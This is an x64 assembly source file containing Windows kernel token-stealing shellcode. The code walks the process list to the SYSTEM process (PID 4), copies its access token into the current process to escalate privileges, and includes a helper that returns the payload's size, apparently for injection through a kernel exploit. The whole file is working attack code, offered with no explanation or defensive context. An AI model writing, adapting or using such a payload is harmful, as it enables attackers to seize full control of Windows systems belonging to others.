.code
	TokenStealingShellcode proc
		mov r12, rax
		mov rax, qword ptr gs:[188h]  ; _ETHREAD.Tcb.CurrentThread
		mov word ptr [rax+1e4h], 0    ; set _ETHREAD.Tcb.KernelApcDisable to 0
		mov rax, qword ptr [rax+0b8h] ; copy offset from nt!PsGetCurrentProcess
		mov rbx, rax
		loop1:
			mov rbx, [rbx+2f8h] ; ActiveProcessLinks->Blink
			sub rbx, 2f0h
			cmp word ptr [rbx+2e8h], 4
			jnz loop1
		mov rbx, [rbx+360h] ; rbx = SYSTEM Token
		and bl, 0f0h        ; clear Token.RefCnt to 0
		mov [rax+360h], rbx
		mov rax, r12
		mov rcx, 8ah
		ret
	tokenstealingshellcode endp

	GetShellcodeSize proc
		mov rax, GetShellcodeSize-TokenStealingShellcode
		ret
	GetShellcodeSize endp
end
